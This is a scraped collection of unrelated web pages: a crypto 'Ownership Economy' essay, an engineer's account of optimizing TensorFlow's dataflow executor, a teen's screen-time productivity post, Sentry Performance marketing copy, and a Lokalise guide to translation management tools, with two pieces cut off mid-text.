<p>And about discoverability. Have you heard of social media? Blog posts? I discover a lot of new Github projects on a regular basis and almost none, I have discovered via Github itself. People talk about good projects and share them, plain and simple.</p>
<p>If you simply like Github and their network and their continuously "evolving" UI, have at it. To each their own.</p>
<p>If you don't like Github, do not stay. Be the change you want to see.</p></div></div>]]>

		<div>

			
<p>One of the most stunning things about the technology we consume everyday is the degree to which it is built, operated and even funded by its users.</p>



<div><p>The device you’re using to read this post, the software that’s displaying it, the server hosting this content and so much else on the internet are built with open-source code contributed by a global community of developers. Platforms like Wikipedia, YouTube, Twitter, Facebook, and Airbnb all operate around content and products sourced from individuals, not corporations. And increasingly marketplaces like Kickstarter, Patreon, Substack, and many other new <a href="https://a16z.com/2019/10/08/passion-economy/" target="_blank" rel="noopener">Passion Economy</a> platforms enable users to directly fund the products, information, and services that they consume.</p><p>As user participation becomes evermore mainstream and complex, the next step is platforms that are not only built, operated, and funded by users—but <strong><em>owned</em></strong> by users too.</p></div>



<div><p>Ownership, via employee stock option plans, has been a powerful tool for incentivizing talented people to dedicate their skills to building startups in Silicon Valley. While this model has been extremely successful, it hasn’t been accessible to all, constrained by geography and legacy financial infrastructure, among other factors. One result is that the economic interests of the biggest internet platforms are concentrated and often <a href="https://www.wired.com/story/how-blockchain-can-wrest-the-internet-from-corporations/" target="_blank" rel="noopener">poorly aligned with their most valuable contributors</a>, their users. Now, new technologies are shifting work and value distribution to be accessible online, resulting in a new generation of platforms that thrive on contributions from a permissionless and global talent pool.</p><p>Ownership is a powerful motivator for users to contribute to products in deeper ways, be it with ideas, computing resources, code, or community building. This more <a href="https://jessewalden.com/past-present-future-from-co-ops-to-cryptonetworks/" target="_blank" rel="noopener">cooperative economic model</a> helps ensure better alignment with users over time, resulting in platforms that can be larger, more resilient, and more innovative.&nbsp; <strong>This is the Ownership Economy, and beyond being a positive social endeavor, the platforms building it are able to leverage the strongest form of market incentives to grow network effects.</strong></p><p>While most prevalent in crypto today, The Ownership Economy is expanding to other areas in tech. To understand why, we can look to recent history and observe how protocol innovations often expose disruptive new models that, when productized, influence broader trends and go on to impact billions.</p></div>



<h4>Identifying Disruptive Models Through Protocol Innovations</h4>



<p>The history of protocol adoption fits a pattern: first, early-adopters use new protocols to do things that were impossible before the new technology empowered them to do so. Very often, this new behavior involves <a href="https://medium.com/@simonhmorris/if-youre-not-breaking-rules-you-re-doing-it-wrong-bittorrent-lessons-for-crypto-2-of-4-72c68227fe69" target="_blank" rel="noopener">breaking the rules</a>. Then, a winning strategy for founders is to build products that make these new models more accessible to a wider audience.&nbsp;</p>



<div><p>Consider the early web protocols: IP, HTTP, standards like HTML, then RSS. At first, popular websites used these protocols to create carbon-copies of physical analogues, like newspaper cover pages or classified ads. But as internet adoption went mainstream, users began publishing their own content: independent blogs, podcasts, newsletters and forums paved the way for the user-generated content platforms that dominate publishing today.</p><p>Another example is BitTorrent, <strong>a protocol innovation of packet distribution, but a disruption that underpinned the streaming revolution</strong>. When BitTorrent first became popular, Netflix was still mailing DVDs in the mail. Meanwhile, the peer-to-peer technology enabled consumers to access music, movies, software, and video games instantaneously, as if the files were already on their hard drives. By 2004, BitTorrent comprised one-third of all internet traffic.</p><p><strong>Consumers’ passion for torrenting signaled that they wanted to access the world’s media at their fingertips,</strong> but for many, BitTorrent wasn’t a user-friendly experience; trackers were moving targets, cluttered and difficult to navigate.&nbsp;</p></div>



<p>One person who saw an opportunity through the noise was Daniel Ek, founder of Spotify. As CEO of <a href="https://en.wikipedia.org/wiki/%CE%9CTorrent" target="_blank" rel="noopener">µTorrent</a>, one of the most popular BitTorrent clients, Ek understood that piracy wasn’t about stealing—it was about access. The winning formula was providing access to the world’s music in a clean, well-designed product.</p>



<p>Today, crypto tokens are the latest protocol innovation to expose a disruptive new model. Just as BitTorrent allowed us to exchange packets of information instantly and without an intermediary, crypto tokens let us distribute value in the same way.<strong> <p>The protocol innovation of tokens is akin to <em>packets for value</em>, but the disruption is in the way new software platforms can be built and gain adoption.</p></strong> <span>The breakthrough of early crypto networks is a new model for market-driven networks, where users build, operate and </span><b><i>own</i></b><span> a piece of the products and services that they use everyday.</span></p>



<h4>The Ownership Economy, Pioneered by Crypto</h4>



<div><p><strong>The idea of user ownership is at the core of the success of Bitcoin and Ethereum, the first user-owned and operated networks at scale.</strong> Bitcoin arrived in 2009, the year that marked a rapid acceleration of economic inequality and the role of the internet in people’s daily lives. Bitcoin promised a new economic means to participate in modern technology history, simply by running open-source software on your computer. Rather than needing to live in a specific place and pursue a specific career in order to reap the benefits of the new economy, anyone with an internet connection could participate by “mining” or securing the network. In return, they earned newly minted Bitcoin, an ownership stake in the network itself.</p><p>Ethereum’s 2015 launch expanded the type of computation possible on blockchain networks, enabling a broader range of applications and allowing developers to experiment with new ways of expressing ownership in code. The best-designed Ethereum-based applications leverage a <a href="https://jessewalden.com/cryptos-business-model-is-familiar-what-isnt-is-who-benefits-2/" target="_blank" rel="noopener">business model similar to traditional Web 2.0 marketplaces</a>, but encode them in autonomous “smart contracts” run by Ethereum’s network of miners. This means these applications have no central operator. <strong>Rather than a platform’s inner circle of founders and investors taking home the value, users are able to earn the majority of value generated from their collective contributions.&nbsp;</strong></p></div>



<p>Needless to say, one of the most challenging problems any startup or new technology faces is adoption, especially where network effects are necessary—and even more-so when competing against the existing network effects of today’s dominant platforms. As the early Bitcoin and Ethereum communities came to realize, ownership is a tool to help surmount this problem. Those early communities were largely composed of technologists, developers, and enthusiasts who were naturally among the first to recognize the power of tokens as direct economic incentives. But today, founders are bringing the idea of ownership —&nbsp; or at least, better economic alignment between platforms and participants — to new verticals in tech, from developer infrastructure, to financial services, and from consumer marketplaces to social.</p>



<h4>How next-generation platforms are driving an ownership economy</h4>



<p>The ownership economy doesn’t always mean a literal distribution of tokens, stock options, or equity. It also doesn’t necessarily mean that an application or service is entirely built on a blockchain. Rather, it means that ownership —&nbsp;which may manifest in the form of novel economic rewards, platform governance, or new forms of social capital —&nbsp;can be a new keystone of user experiences, with plenty of design space to explore.</p>



<p>Some examples: In payments, <a href="http://celo.org/" target="_blank" rel="noopener">Celo</a> is making digital dollars and financial applications accessible to anyone with an internet connection via a blockchain network that, like Bitcoin, is entirely user owned and operated. In finance, startups like <a href="https://www.binance.com/en/bnb" target="_blank" rel="noopener">Binance</a> and <a href="https://numer.ai/" target="_blank" rel="noopener">Numerai</a> have leveraged tokens to distribute revenue from the platform directly to their users, fueling brand loyalty and growth. <a href="http://compound.finance/" target="_blank" rel="noopener">Compound</a>, a money market, recently completed its journey of <a href="https://jessewalden.com/progressive-decentralization-a-playbook-for-building-crypto-applications/" target="_blank" rel="noopener">progressive decentralization</a> to become <a href="https://medium.com/compound-finance/compound-community-ownership-ee0ed1252cc3?source=collection_home---4------0-----------------------" target="_blank" rel="noopener">a community owned</a> marketplace for borrowing and lending.</p>



<p><a href="http://uniswap.io/" target="_blank" rel="noopener">Uniswap</a>, a crypto exchange, has a business model similar to Coinbase or Binance in that it imposes a fee on transactions. But rather than the company capturing that fee, it’s instead distributed to the market-making traders that provide liquidity and make the product useful. Since Uniswap is open source and user-owned, third-party developers can have confidence building on the platform and a rich ecosystem of integrations has grown around the project.</p>



<p>In social, Reddit recently announced that 300 million users will have access to tokenized <a href="https://www.reddit.com/community-points/?utm_source=reddit&amp;utm_medium=usertext&amp;utm_name=FortNiteBR&amp;utm_content=t3_gj8tm1" target="_blank" rel="noopener">community currencies</a> through their mobile app. The platform will reward participants in the <a href="https://www.reddit.com/r/FortNiteBR/comments/gj8tm1/introducing_rfortnitebr_bricks/" target="_blank" rel="noopener">r/FortniteBR</a> and <a href="https://www.google.com/search?q=r%2FCryptocurrency+moons&amp;oq=r%2FCryptocurrency+moons&amp;aqs=chrome..69i57j0j69i58.880j0j7&amp;sourceid=chrome&amp;ie=UTF-8" target="_blank" rel="noopener">r/Cryptocurrency</a> subreddits with tokens that can be used to pay for membership, tipping, and badges in the Reddit app, giving them ownership over the economy of each subreddit.&nbsp;&nbsp;</p>



<p>Consumer marketplace <a href="http://withfoundation.com/" target="_blank" rel="noopener">Foundation</a> is transforming the Kickstarter model by allowing creators to tokenize their projects in a marketplace where tokens can be bought, sold or redeemed for goods or services. This programmable, digital representation of ownership unlocks new revenue streams that gives buyers and creators access to new value streams in secondary markets.&nbsp;</p>



<p>Global talent marketplace <a href="http://www.usebraintrust.com/" target="_blank" rel="noopener">Braintrust</a> connects top tech talent with large companies looking to hire them.&nbsp; Their marketplace transacts in USD but uses an Ethereum-based token as its core incentive and governance system to distribute value to contributors.&nbsp;&nbsp;</p>
<figure></figure>



<p>In consumer products, the house-of-brands startup <a href="https://www.arfa.co/collective" target="_blank" rel="noopener">Arfa</a> is rewarding customers who contribute to product development—<a href="https://www.arfa.co/collective" target="_blank" rel="noopener">The Arfa Collective</a>—with a 5 percent share of company profits. They hope these direct economic incentives can help build a more loyal customer base with lower marketing costs over time.&nbsp;</p>



<p>Other platforms like <a href="https://hackernoon.com/birds-new-platform-program-and-the-rise-of-the-business-in-a-box-899f7ac58abb" target="_blank" rel="noopener">Bird</a> and <a href="https://dumpling.us/" target="_blank" rel="noopener">Dumpling</a> are putting …</p></div></div></div>

    <p>Friday was my last day working on <a href="https://www.tensorflow.org/">TensorFlow</a> at Google. The past five years were a lot of fun, and I feel incredibly lucky to have been in the war room at 6 AM when we <a href="https://bits.blogs.nytimes.com/2015/11/09/google-offers-free-software-in-bid-to-gain-an-edge-in-machine-learning/">launched the project into the world</a>. Since then, it’s been inspiring to see how people have used TensorFlow, from all the folks <a href="https://stackoverflow.com/users/3574081/mrry">asking questions on Stack Overflow</a>, through the machine learning and systems <a href="https://scholar.google.com/scholar?oi=bibs&amp;hl=en&amp;cites=13312035063239472247,4870469586968585222,14846780091870890862">research that built on our work</a>, to the huge <a href="https://twitter.com/DynamicWebPaige/status/1065452146924040192">software ecosystem</a> that has grown up around it.</p>

<!--more-->

<p>Before I move on, I wanted to reminisce about what I enjoyed most about working at Google. Google is <a href="https://www.amazon.com/Software-Engineering-Google-Lessons-Programming/dp/1492082791">well-known</a> for the in-house developer infrastructure that its software engineers use every day. Among my favorites as a curious engineer, <a href="https://opensource.googleblog.com/2020/04/code-search-for-google-open-source.html">Code Search</a> and <a href="https://cacm.acm.org/magazines/2016/7/204032-why-google-stores-billions-of-lines-of-code-in-a-single-repository/fulltext">Piper</a> offer a way to learn how almost anything the company uses was implemented, including several systems whose papers have been required reading in graduate-level systems classes for more than a decade (and even the edit histories for some of those papers).</p>

<p>For me, however, the most vital developer infrastructure was the <a href="https://research.google/pubs/pub36575/">Google Wide Profiler (GWP)</a>. GWP aggregates profiles from all code running in production, so you can understand how it performs under realistic conditions. Once a piece of code becomes heavily used, it starts showing up in GWP, letting you measure the impact of performance optimizations in terms of thousands of CPUs saved, or more. Sometimes a straightforward C++ change, like adding a <code>std::move()</code>, or switching a <code>std::string</code> argument to take a <a href="https://en.cppreference.com/w/cpp/string/basic_string_view"><code>std::string_view</code></a>, will save a few hundred cores.<sup id="fnref:1"><a href="#fn:1">1</a></sup> In terms of effort-to-impact ratio, <a href="https://github.com/tensorflow/tensorflow/commit/2c130a0d252741d2c0ce1e0d815ac1d87d53d6e3#diff-ba035a495fc7daf4cd233f428921bd96">this single character change to the <code>tf.concat()</code> implementation</a> will be hard to beat. But GWP can also spur deeper investigations, and I wanted to share one: the story of my final significant contribution to TensorFlow.</p>

<h2 id="a-gwp-story-optimizing-tensorflows-executor">A GWP story: optimizing TensorFlow’s executor</h2>

<p>Most mornings, I would check in with GWP to see what functions in TensorFlow were hot over the last day, and find if there were any surprising new entries or regressions. One day during mandatory work-from-home, I ran my usual GWP query, and a familiar symbol stared back at me: <a href="https://github.com/tensorflow/tensorflow/blob/r2.2/tensorflow/core/common_runtime/executor.cc#L2174-L2281"><code>tensorflow::(anonymous namespace)::ExecutorState::PropagateOutputs()</code></a>. This method is the heart of TensorFlow’s dataflow executor, and it is responsible for two things: (i) forwarding output tensors from one kernel to the kernels that consume them, and (ii) adding kernels to the scheduler queue when they become runnable. In other words, it is literally <strong>the method that makes tensors flow in TensorFlow</strong>. It was also painfully inefficient, and I didn’t want to leave it as unfinished business.</p>

<p>For sure, <code>PropagateOutputs()</code> is non-trivial code, and <a href="https://github.com/tensorflow/tensorflow/commit/de94a13ce98f2477d890cae02a6ea3846a9ba2b7">better engineers than I have optimized it</a> down to the level of structure packing and bitfields. Even with these optimizations, it remained stubbornly expensive, made worse by the <a href="https://github.com/tensorflow/tensorflow/blob/2b96f3662bd776e277f86997659e61046b56c315/tensorflow/core/common_runtime/executor.cc#L2201">contended mutex that guards the state update</a>. This mutex would cause most kernel completions within a single graph to run serially, and put worker threads to sleep when they still had a lot of work to do. This was particularly bad when you had a lot of fine-grained and potentially parallelizable kernels in your graph, which is common in both inference and <code>tf.data</code> input preprocessing.</p>

<p>Despite this complexity, the high-level logic in <code>PropagateOutputs()</code> is simple, based on <a href="https://en.wikipedia.org/wiki/Topological_sorting#Kahn's_algorithm">Kahn’s algorithm for topological sorting</a>:</p>

<ol>
  <li>Each kernel starts out with a “pending count” equal to its in-degree.</li>
  <li>When a kernel finishes, it forwards its outputs along edges in the graph, and decrements the pending count for each consumer kernel.</li>
  <li>When the pending count for a kernel hits zero, it becomes runnable, and we add it to the ready queue.</li>
</ol>

<p>Unfortunately, it’s a bit more complicated than that: the propagation rules are different if the consumer is a special control flow kernel, or if the edge is in a dead branch of a control flow construct (e.g. the untaken branch of a <a href="https://www.tensorflow.org/api_docs/python/tf/cond?hl=en"><code>tf.cond()</code></a>).<sup id="fnref:2"><a href="#fn:2">2</a></sup> That means <code>PropagateOutputs()</code> had to load the graph node structure for each consumer kernel, which was unlikely to be in the cache already, and compute hard-to-predict branches on it. On top of this overhead, the mutex in <code>PropagateOutputs()</code> had bothered me for a long time. It always seemed possible to model the “pending count” as an <a href="https://en.wikipedia.org/wiki/Reference_counting">atomic reference count</a> and remove the mutex altogether for some graphs. However, the code is intricate, and so heavily used that one false step changing it could easily cost more than my salary in increased utilization.</p>

<p>The answer seemed clear: we need one executor for graphs with control flow, and another simpler executor for graphs without it. The original release of TensorFlow actually had this split, but it was too tedious to keep the duplicated logic in sync, so <a href="https://github.com/tensorflow/tensorflow/commit/96aa23e45e72bd765920cc957090ff453e25cf64">we combined them</a>. To land the optimization, I needed a zero-cost way to dispatch to different implementations of <code>PropagateOutputs()</code> based on the static graph topology: even making <code>PropagateOutputs()</code> a virtual method would slow down existing users too much. I’m quite pleased with the following refactoring steps, which achieved my goal without too much churn or duplication:</p>

<ol>
  <li><a href="https://github.com/tensorflow/tensorflow/commit/bd530a65d5712b0734c0b6c9af5aa83ccd9e7387">Split</a> the propagation and execution logic into two classes, <code>PropagatorState</code> and <code>ExecutorState&lt;PropagatorStateType&gt;</code>.</li>
  <li><a href="https://github.com/tensorflow/tensorflow/commit/4c36ade963b0a7f1c8d2ea480d5b8c0922f6bebf">Implement</a> a <code>SimplePropagatorState</code> class with the same interface as <code>PropagatorState</code>, and <a href="https://github.com/tensorflow/tensorflow/commit/4c36ade963b0a7f1c8d2ea480d5b8c0922f6bebf#diff-f0761b2f596c3251df04d000e21d4cf9R1272-R1274">instantiate an <code>ExecutorState&lt;SimplePropagatorState&gt;</code> when the graph contains no control flow</a>. The <code>SimplePropagatorState</code> avoids unnecessary indirections, dynamic allocations, and branches when running simple graphs.</li>
  <li><a href="https://github.com/tensorflow/tensorflow/commit/4b05562d485600e824f828e089f21646bf3efcc4">Replace</a> the <code>PendingCounts</code> in <code>SimplePropagatorState</code> with <a href="https://github.com/tensorflow/tensorflow/commit/4b05562d485600e824f828e089f21646bf3efcc4#diff-c30dd4145e8b858ce581e36cad94c1d9R99-R101">atomic counts for each kernel</a>, and finally <a href="https://github.com/tensorflow/tensorflow/commit/4b05562d485600e824f828e089f21646bf3efcc4#diff-c30dd4145e8b858ce581e36cad94c1d9L68">get rid of the infernal mutex</a>.</li>
</ol>

<p>Along the way, I relied on a <a href="https://github.com/tensorflow/tensorflow/blob/de5b0cfd434c7a9f848ab100b70a6be16e48280b/tensorflow/core/common_runtime/executor_test.cc">growing suite of microbenchmarks</a> to make sure that my changes didn’t slow down existing users. For a general-purpose component like the executor, it can be hard to predict what benchmarks will be useful, so I used measurements from GWP to write microbenchmarks that tracked realistic usage patterns.<sup id="fnref:3"><a href="#fn:3">3</a></sup> The microbenchmarks contain a suite of synthetic graphs, and, when run under <a href="https://github.com/google/pprof"><code>pprof</code></a>, they gave me an easy way to visualize executor performance as a <a href="http://www.brendangregg.com/flamegraphs.html">flamegraph</a> or drill down to the time spent in individual instructions.</p>

<p>The results so far have been pretty encouraging. As days went by, GWP showed the fraction of time spent in <code>PropagateOutputs()</code> decrease as users rebuilt their code with the latest version. There were some decent reductions to inference latency, with some users reporting up to a 10% improvement end-to-end.  If you want to try out the new code, the changes will be in the upcoming 2.3 release, or they are available today <a href="https://github.com/tensorflow/tensorflow/">on GitHub</a> and in <a href="https://pypi.org/project/tf-nightly/">tf-nightly</a>. There are still opportunities to improve things: in particular, it feels like it should be possible to extend the atomic optimization to at least some graphs that have control flow (at least <code>tf.cond()</code>, if not <code>tf.while_loop()</code>). If you see something that could be done better, I hope you’ll consider <a href="https://github.com/tensorflow/tensorflow/pulls">submitting a pull request</a>!</p>

                <p>I wasn't always productive.</p><p>I used to spend my days and nights surfing Instagram and Snapchat while watching funny cat videos as a part time job.</p><p>It was boring, useless, and silly.</p><p>But after 3 years of self development and web development, <strong>I now only spend less than 20 minutes a day on my cell phone</strong>. Here's proof:</p><figure><img src="https://joshternyak.com/content/images/2020/07/screen-time.png" alt="screen time less than 20 minutes" srcset="https://joshternyak.com/content/images/size/w600/2020/07/screen-time.png 600w, https://joshternyak.com/content/images/size/w1000/2020/07/screen-time.png 1000w, https://joshternyak.com/content/images/size/w1600/2020/07/screen-time.png 1600w, https://joshternyak.com/content/images/size/w2400/2020/07/screen-time.png 2400w"></figure><p>As you can see, I spend 38 minutes on "Social Networking", which only includes messenger and the alarm clock. I DO NOT have any social media apps on my cell phone. </p><p>Completely removing non-essential apps from my phone has saved me quite literally my life (to clarify: my definition of "my life" is what I spend all of my time on).</p><p>But how did I, a 15 year old web nerd who used to spend 7+ hours on my cell phone like millions of others, "become" so <strong>productive</strong>?</p><p>I'll tell you..</p><h2 id="wasting-your-time-wasting-your-life-">Wasting your time = wasting your life.</h2><p>We all know humans have become professional time-wasters, whether it's surfing Snapchat for funny stories or posting on Facebook how bored they are.</p><p>I used to do these exact same things.</p><p>But then I did something that completely changed my life:</p><blockquote><strong>I FORCED MYSELF TO REALIZE THAT WASTED TIME = WASTED LIFE</strong></blockquote><p>For anyone who has trouble with productivity, this is the most important piece of advice I can give you:</p><blockquote>Once you realize that wasting time means you're wasting your life, then you'll probably want to change something about what you do everyday.</blockquote><p>But that probably leaves you with the question:</p><p>So, how did I, Josh Ternyak, actually reduce my screen time from 7+ hours a day (full time job) to less than 20 minutes a day 😎?</p><p>Here's how:</p><ol><li>I found meaningful work to do to fill up my time instead of removing distractions and not having anything important to do</li><li>I deleted ALL APPS except for the apps the Iphone is made with to start with</li><li>I put my cell phone in the opposite side of the house shut off completely</li></ol><h2 id="it-s-not-that-scary-">It's not that scary.</h2><p>And that's it! It's less scary than it seems. </p><p>I remember the days when I was glued to my phone. And I'm NEVER going back to that lifestyle.</p><p>Now that I'm working on so many great projects, learning new skills, and spending my time on the important things in life, I hope what I've learned along the way will help you save your time, and quite literally...your life.</p>

<p>From tracking down slow-loading pages to ensuring auto-completes actually complete, <a href="https://docs.sentry.io/performance-monitoring/getting-started/">Performance</a> gives you deeper visibility into the API calls and database queries that are critical toward delivering fast customer experiences with just five lines of code. </p>
<blockquote>
<p>We’ve been using Sentry since the early days of Tackle, so getting set up with Performance was literally a one-line change for us. It quickly identified problematic endpoints and how our users were being impacted. We’re now planning some improvements to these APIs; can’t wait to see those times go down!</p>

</a>Developers: Take Comfort in Resolving User Misery</h2>
<p>Slow is a relative term. It’s why, in order to properly troubleshoot a slow customer experience, you need a consistent metric for slow. Enter User Misery. By pairing industry metrics with user metrics, User Misery tells you what is making any number of users…miserable. This means getting out in front of painful experiences before they become problems, and problems before they cause your customers to churn.</p>

</a>Mission-critical Context</h2>
<p>Without context, a customer’s spinning pinwheel can quickly turn into a developer’s panic spiral. Transaction Summary surfaces transactions by duration time, related code errors, and impact to the customer. With it, you can quickly see the number of affected users as well as the transaction’s impact on your response time. And by defining Key Transactions, your team can prioritize those critical functions and callbacks that need to be addressed immediately.</p>

<p>Some error monitoring tools show you data from a frontend error. Only Performance can trace that frontend back to its API calls and slow database queries - all while surfacing related errors. What’s more, Performance aggregates the metadata surrounding your errors so you can easily search and sort your exceptions.</p>

<blockquote>
<p>Sentry’s performance tracking has been a huge help for us. Before, it was difficult to know exactly how long key functions actually took to load in real-time conditions. Now, we have metrics to assess whether load times are acceptable and we can learn which conditions impact performance, as part of our drive to constantly improve the user’s experience.</p>

                        <p>If you want to reach a global audience, you need to be ready to localize your content, product, and customer support in those languages.</p>
<p>But language translation can be a fragmented, slow process without the right tools. Here’s everything you need to get started—no spreadsheets required. Let’s start at the beginning.</p>


<h2><span id="What_features_should_translation_software_have">What features should translation software have?</span></h2>
<p>No single translation software tool is perfect, but it’s important to make sure you invest in one that can scale and grow alongside your company as your company’s needs do. Translation software can be simple, computer-assisted tools that provide specific translations.</p>
<p>What you’re probably looking for, however, is a translation management system.</p>
<p><a href="https://lokalise.com/blog/translation-management-system/">Translation management systems (TMS)</a> accelerate the translation or localization process. These systems automate and organize the localization workflow and track progress of different translation projects. Both cloud-based and desktop options exist for TMS, which is a good place to start when choosing a system.</p>
<ul>
<li><b>Cloud-based software</b> saves translations in real time and allows anyone in your company to access them, as long as they have an Internet connection.</li>
<li><b>Desktop translation software</b> is managed on premise. This can make it more difficult to have full control over linguistic assets and make it more complicated to change vendors.</li>
</ul>
<p>Most TMS include three components: <a href="https://lokalise.com/blog/localization-and-translation-glossary-terms/">computer-assisted translation (CAT) tools</a>, workflow automation tools, and project management tools. When choosing a translation management system, keep these features in mind:</p>
<h3><span id="1_Computer-Assisted_Translation_CAT_Tools">1. Computer-Assisted Translation (CAT) Tools</span></h3>
<p>No cats involved.</p>
<p>CAT tools cut a translator’s workload and improve translation speed, quality, and consistency. It allows previously human-translated text to pop up conveniently for the translator, allowing them to browse through previously translated content and match new requests to a library. Look for features like:</p>
<h4><span id="Translation_memory_and_glossary">Translation memory and glossary</span></h4>
<p>With translation memory, CAT software stores translations as you go, so you don’t need to translate the same term twice. Every time you save a translation, it’s added to a database of sentences, paragraphs, and texts with their translations that are automatically reused for similar or identical content. Everything that you (or any other team members) type in the editor or upload or set via an API is saved automatically in the translation memory for future use.</p>
<p>Similarly, a glossary (also known as term base, or dictionary) of company-specific technology — such as product names or special terms used by a company to differentiate against the competition — ensures specific words and terms are translated consistently. This ensures consistency across materials and allows you to eliminate any ambiguity about what you really mean when you say a specific term.</p>
<p>This way, if you have industry-specific jargon, product names, or marketing messaging, you know it will be the same everywhere. Even if these translations are made by different people, or requested by different areas of your company, you know that the most important terms will be the same.</p>
<h4><span id="Quality_assurance">Quality assurance</span></h4>
<p>Everyone makes mistakes. That’s why it’s important to always check your work—and a good quality assurance (QA) tool can do that for you. A <a href="https://lokalise.com/features/translation-quality-assurance">quality assurance tracker</a> goes over your translations with a fine-toothed comb to automatically detect and notify you about any errors, from spelling and grammar mistakes to simple copy-and-paste issues like double spaces or formatting issues.</p>
<p>Common mistakes we see beyond basic spelling and grammar are inconsistent placeholders, changing number or content for email addresses or URLs, leading and trailing whitespace, different brackets or numbers, and inconsistent HTML. A good QA tool will catch those!</p>
<p>In many languages, grammatical errors quickly go from weird to completely different meanings. This is especially important with any legal, medical, or financial documents, since slight changes in wording or spelling issues could result in misleading information.</p>
<h3><span id="2_Workflow_Automation_Tools">2. Workflow Automation Tools</span></h3>
<p><a href="https://lokalise.com/features/localization-workflow-management">Workflow automation tools</a> automate the localization process by reducing manual work and saving time between different systems you may be running in your tech stack. It can also speed up certain steps in the workflow, like setting up language auto-fill rules, running duplicate checks, or referencing previously translated keys. More importantly, workflow tools allow your team to collaborate, manage and review translations in a productive, flexible and efficient way. Look for features like:</p>
<h4><span id="Branching_Version_control">Branching (Version control)</span></h4>
<p>Your content will change—that’s the only constant in today’s software-driven world. New products, new messaging, new logos, or new instructions can adjust what you’ve already translated. Rather than translate the entire thing again, use version control to work on a new version while simultaneously supporting previous versions. Merge the two when ready, and resolve any automatically identified conflicts.</p>
<h4><span id="In_context-editing">In context-editing</span></h4>
<p><a href="https://lokalise.com/features/in-context-editing">In-context editing tools</a> give your translators and team members more context by showing where and how the translated text will be displayed. When a translator can see the environment in which the word or sentence is used, it’s much easier to provide an accurate, natural translation to that word or sentence.</p>
<p>This is especially helpful with approvals and iterations across larger teams, so you can easily see how translated language flows into new interfaces or content types. (Spoiler alert: English to German will add three or four lines to every section!)</p>
<h4><span id="Integrations_with_your_existing_technology">Integrations with your existing technology</span></h4>
<p>Any time you’re looking for a new software tool, it’s important to know <a href="https://lokalise.com/product/integrations">how it will interact </a>with the rest of your tech stack. This is especially true of translation tools, since you’ll need translations for any externally facing content, from the homepage of your website to your support chat.</p>
<p>Does your tool integrate with:</p>
<ul>
<li><a href="https://lokalise.com/blog/figma-lokalise/">Design tools like Sketch and Figma</a> so you can easily see how translations impact (or potentially break) layout, design, and overall UX early on before a single line of code is written?</li>
<li>Code repositories like <a href="https://github.com/">Github</a>, <a href="https://about.gitlab.com/">Gitlab</a>, and <a href="https://bitbucket.org/product/">Bitbucket,</a> so you can instantly import language file updates?</li>
<li>Engineering tools like <a href="https://www.jenkins.io/">Jenkins</a>, <a href="https://gruntjs.com/">Grunt</a>, and <a href="https://www.docker.com/">Docker</a> so you can build faster and more seamlessly?</li>
<li>Workflow tools like <a href="https://lokalise.com/product/for-managers">Asana, Jira, Trello, and Slack</a> so your team can stay on the same page?</li>
<li>Support tools <a href="https://lokalise.com/features/support-ticket-translation">like Zendesk and Intercom</a> so you can translate incoming support interactions if needed?</li>
<li>CMS tools like <a href="https://lokalise.com/features/localization-workflow-management">WordPress</a> and <a href="https://docs.lokalise.com/en/articles/3132867-contentful">Contentful</a> so you can publish and send content in multiple languages?</li>
</ul>
<p>If you use any homegrown technology, you’ll want to check that you can create custom API or webhooks so you can easily automate any interaction your team will have in the translation workflow. It’s a good idea to map out your most important integrations and how your team will use the software before choosing a specific tool.</p>
<h3><span id="3_Project_Management_Tools">3. Project Management Tools</span></h3>
<p>The final product is one thing; how the translation gets done is another. Any project manager needs tools where they can track translation progress, create and assign tasks to translators, and identify bottlenecks or missed deadlines. Look for features like:</p>
<h4><span id="Collaborative_translation">Collaborative translation</span></h4>
<p>While there may be one translator on a project, they’re likely not working alone. Developers, managers, marketers, translators, and other teammates may need to weigh in, request edits, or ask for additional support.</p>
<p>A <a href="https://lokalise.com/features/collaborative-translation">tool that does all of this in one place</a> will go far to make sure translation projects stay on time and efficient. Make it easy for your team to work together by looking for features like tasks, chats, comments, and @mentions so everyone is always on the same page.</p>
<p>When your team can work together, you’ll be able to produce the best possible translation.</p>
<h4><span id="User_management">User management</span></h4>
<p>While you may have multiple people on a project, you don’t want <i>too</i> many cooks in the kitchen. Restricting some access rights and defining custom feature availability based on user role can minimize the risk of unapproved activities. As mundane as it may seem, user groups, assigning roles and tasks can keep your translation projects on task and on time.</p>
<h4><span id="Analytics_and_performance">Analytics and performance</span></h4>
<p>Most translation processes feel like a deep, dark hole. You know words are being translated, but how many? Especially if you don’t speak multiple languages, it can be hard to assess the performance. That’s why an analytical element is important to include in any tool you’re looking for—so you can keep track of words translated per language, team members on a project, amount of keys, completion percentage, and more.</p>
<p>There are three types of analytics you’ll want to have:</p>
<ul>
<li>Team level: monitoring user activity, such as how many projects created, and how quickly a project moves to completion.</li>
<li>Project level analytics: understanding each project, such as the number of team members and completion percentage.</li>
<li>Translation analytics: keeping track of word counts, management of translation profiles, and TM leverage.</li>
</ul>
<h3><span id="Other_Features_to_Keep_in_Mind">Other Features to Keep in Mind</span></h3>
<h4><span id="Language_pairs">Language pairs</span></h4>
<p>With over 6,500 languages in the world spoken today, double-check that a given tool supports the language translations you want to have. That includes translation between all languages, such as from French to Japanese, not just from English to other languages.</p>
<p>This includes technical languages, too. To truly localize your software, you’ll need a tool that can <a href="https://lokalise.com/blog/translate-html-content/">handle HTML</a>, Javascript, and other applications.</p>
<h4><span id="Translation_services">Translation services</span></h4>
<p>If you don’t have your own team of translators to pull from, finding a tool that offers <a href="https://lokalise.com/features/professional-translation-services">professional translation services</a> can make everything easier. Popular translation providers include:</p>
<ul>
<li>Machine translation solutions like <a href="https://cloud.google.com/translate">Google Translate</a> and DeepL: Google Translate is a simple and affordable way to translate digital content using machine translation (MT) in over 100 languages. Note that end translations should be checked to ensure that they …</li></ul></article></div>

            <section>
                <div>
